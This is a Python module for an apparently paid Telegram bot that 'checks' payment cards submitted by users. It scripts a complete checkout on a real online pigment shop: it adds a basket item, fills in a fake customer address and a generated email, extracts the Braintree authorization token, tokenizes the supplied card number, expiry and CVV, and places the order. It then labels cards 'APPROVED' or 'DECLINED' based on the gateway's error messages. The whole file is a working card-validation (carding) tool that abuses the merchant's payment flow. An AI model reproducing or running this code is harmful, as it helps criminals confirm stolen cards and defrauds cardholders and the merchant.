import time, base64
from src.extras.checklib import MakeGate, ScrapInfo
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode

name_gate = "Braintree_Charged"
subtype = "30.00$ Charged"
command = "bra"


@Client.on_message(
    filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False)
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg)


async def get_live(card, msg):

    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_split = MakeGate(card).get_card_details()
    ccn = card_split[0]
    month = card_split[1]
    year = card_split[2]
    if len(year) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    if ccn[0] == "4":
        card_type = "Visa"
    elif ccn[0] == "5":
        card_type = "MasterCard"
    elif ccn[0] == "3":
        card_type = "AMEX"
    elif ccn[0] == "6":
        card_type = "DS"

    initial_time = time.time()
    data_bin = MakeGate(card).bin_lookup()

    session = ScrapInfo().session()
    email = ScrapInfo().email_generator()

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://shop.kremerpigments.com",
        "priority": "u=0, i",
        "referer": "https://shop.kremerpigments.com/us/shop/new-products/63322-gum-arabic-granules.html",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = {
        "mss_commerce_basket_action": "addArticle",
        "mss_commerce_basket_isVariant": "1",
        "mss_commerce_basket_articleId": "14230",
        "mss_commerce_basket_number": "2",
    }

    response = session.post(
        "https://shop.kremerpigments.com/us/shop/new-products/63322-gum-arabic-granules.html",
        headers=headers,
        data=data,
    )

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    # ======= Checking zip code fees =========

    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "es-419,es;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://shop.kremerpigments.com",
        "priority": "u=1, i",
        "referer": "https://shop.kremerpigments.com/us/shop/basket/1/",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }

    data = {
        "type": "setShopSelect",
        "countryCode": "US",
        "stateCode": "",
        "zipCode": "20080",
    }

    response = session.post(
        "https://shop.kremerpigments.com/us/system/ajax", headers=headers, data=data
    )

    # ==== Check basket ====

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-419,es;q=0.9",
        "priority": "u=0, i",
        "referer": "https://shop.kremerpigments.com/us/shop/basket/1/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    response = session.get(
        "https://shop.kremerpigments.com/us/shop/basket/1/", headers=headers
    )

    # ======= Getting the address ========

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://shop.kremerpigments.com",
        "priority": "u=0, i",
        "referer": "https://shop.kremerpigments.com/us/shop/basket/1/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = {
        "shippingType": "48",
        "orderType": "1",
    }

    response = session.post(
        "https://shop.kremerpigments.com/us/shop/basket/2/", headers=headers, data=data
    )

    # ======= Filling out the address =========

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://shop.kremerpigments.com",
        "priority": "u=0, i",
        "referer": "https://shop.kremerpigments.com/us/shop/basket/2/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = {
        "validate": "true",
        "mss_sextf": "1",
        "commerce_customer_sal": "",
        "commerce_customer_fname": "Quack.Inc",
        "commerce_customer_street": "829 Av park",
        "commerce_customer_az1": "",
        "commerce_customer_az2": "",
        "commerce_customer_az3": "",
        "commerce_customer_zip": "10080",
        "commerce_customer_city": "New York",
        "commerce_customer_country": "231",
        "commerce_customer_state": "33",
        "commerce_customer_fon": "893485394",
        "commerce_customer_mobile": "",
        "commerce_customer_eMail": email,
        "commerce_customer_fax": "",
        "commerce_order_comments": "",
        "commerce_customer_password1": "",
        "commerce_customer_password2": "",
        "commerce_order_delivery_sal": "",
        "commerce_order_delivery_fname": "",
        "commerce_orderExt_delivery_az1": "",
        "commerce_orderExt_delivery_az2": "",
        "commerce_orderExt_delivery_az3": "",
        "commerce_order_delivery_street": "",
        "commerce_order_delivery_zip": "",
        "commerce_order_delivery_city": "",
        "commerce_order_delivery_country_id": "39",
        "commerce_order_delivery_state": "",
        "commerce_order_delivery_fon": "",
        "commerce_order_delivery_eMail": "",
        "is_offer": "0",
    }

    response = session.post(
        "https://shop.kremerpigments.com/us/shop/basket/3/", headers=headers, data=data
    )

    # ======== Re-confirming address with taxes========

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://shop.kremerpigments.com",
        "priority": "u=0, i",
        "referer": "https://shop.kremerpigments.com/us/shop/basket/2/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = {
        "validate": "true",
        "mss_sextf": "1",
        "commerce_customer_sal": "",
        "commerce_customer_fname": "Quack.Inc",
        "commerce_customer_street": "829 Av park",
        "commerce_customer_az1": "",
        "commerce_customer_az2": "",
        "commerce_customer_az3": "",
        "commerce_customer_zip": "10080",
        "commerce_customer_city": "New York",
        "commerce_customer_country": "231",
        "commerce_customer_state": "33",
        "commerce_customer_fon": "893485394",
        "commerce_customer_mobile": "",
        "commerce_customer_eMail": email,
        "commerce_customer_fax": "",
        "commerce_order_comments": "",
        "commerce_order_delivery_sal": "",
        "commerce_order_delivery_fname": "",
        "commerce_orderExt_delivery_az1": "",
        "commerce_orderExt_delivery_az2": "",
        "commerce_orderExt_delivery_az3": "",
        "commerce_order_delivery_street": "",
        "commerce_order_delivery_zip": "",
        "commerce_order_delivery_city": "",
        "commerce_order_delivery_country_id": "39",
        "commerce_order_delivery_state": "",
        "commerce_order_delivery_fon": "",
        "commerce_order_delivery_eMail": "",
        "is_offer": "0",
    }

    response = session.post(
        "https://shop.kremerpigments.com/us/shop/basket/3/", headers=headers, data=data
    )

    # ========== Checking b3 form of payment ========

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://shop.kremerpigments.com",
        "priority": "u=0, i",
        "referer": "https://shop.kremerpigments.com/us/shop/basket/3/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = {
        "validatePayment": "true",
        "mss_checkout_payment": "braintreePayment",
    }

    response = session.post(
        "https://shop.kremerpigments.com/us/shop/basket/4/", headers=headers, data=data
    )

    # ========== Summary and agreement =========

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://shop.kremerpigments.com",
        "priority": "u=0, i",
        "referer": "https://shop.kremerpigments.com/us/shop/basket/4/",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = {
        "mss_checkout_confirm": "1",
        "_agbOk": "1",
        "_rorOk": "1",
    }

    response = session.post(
        "https://shop.kremerpigments.com/us/shop/basket/5/", headers=headers, data=data
    )
    try:
        authorization_encode = ScrapInfo().getStr(
            response.text, 'authorization: "', '",'
        )
        authorization_decode = str(
            base64.b64decode(authorization_encode).decode("utf-8")
        )
        real_authorization = ScrapInfo().getStr(
            authorization_decode, '"authorizationFingerprint":"', '",'
        )

        # ===== Filling out the payment form ======

        headers = {
            "accept": "*/*",
            "accept-language": "es-419,es;q=0.9",
            "authorization": f"Bearer {real_authorization}",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "priority": "u=1, i",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }

        json_data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "8b84ae24-fe78-4556-80c7-ef602d644f43",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": ccn,
                        "expirationMonth": month,
                        "expirationYear": year,
                        "cvv": cvv,
                    },
                    "options": {
                        "validate": False,
                    },
                },
            },
            "operationName": "TokenizeCreditCard",
        }

        response = session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=json_data,
        )

        token = ScrapInfo().getStr(response.text, '"token":"', '",')

        # It returns something like this:
        # {"data":{"tokenizeCreditCard":{"token":"tokencc_bc_ycbmvx_378kk7_fdhqqq_5qkqyz_fg4","creditCard":{"bin":"537410","brandCode":"MASTERCARD","last4":"8385","cardholderName":null,"expirationMonth":"08","expirationYear":"2025","binData":{"prepaid":"NO","healthcare":"NO","debit":"YES","durbinRegulated":"NO","commercial":"UNKNOWN","payroll":"NO","issuingBank":"NATIONAL WESTMINSTER BANK PLC","countryOfIssuance":"GBR","productId":"MDP"}}}},"extensions":{"requestId":"43ae0288-a817-4fa7-ad69-efb0140ff90b"}}

        # ========== Getting the response ========
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-419,es;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://shop.kremerpigments.com",
            "priority": "u=0, i",
            "referer": "https://shop.kremerpigments.com/us/shop/basket/5/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }

        data = {
            "bt_payment_method_nonce": token,
            "mss_checkout_confirm": "1",
            "_agbOk": "1",
            "_rorOk": "1",
        }

        response = session.post(
            "https://shop.kremerpigments.com/us/shop/basket/5/",
            headers=headers,
            data=data,
        )

        b3_encode_response = ScrapInfo().getStr(response.text, "btErrorMsg", '"/>')
        b3_response = str(base64.b64decode(b3_encode_response).decode("utf-8"))

        if "Card Issuer Declined CVV" in b3_response:
            msgx = "APPROVED CCN✅"
            respuesta = "Card Issuer Declined CVV"

        elif "Insufficient Funds" in b3_response:
            msgx = "APPROVED CCV✅"
            respuesta = "Insufficient Funds"

        elif "Gateway Rejected: avs" in b3_response:
            msgx = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs"

        elif "Gateway Rejected: avs_and_cvv" in b3_response:
            msgx = "APPROVED ✅"
            respuesta = "Gateway Rejected: avs_and_cvv"

        else:
            respuesta = b3_response
            msgx = "DECLINED ❌"

        final_time = time.time() - initial_time

        card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
        await msg.edit_text(
            card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )
    except Exception as e:
        card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: DECLINED ❌<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {e}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
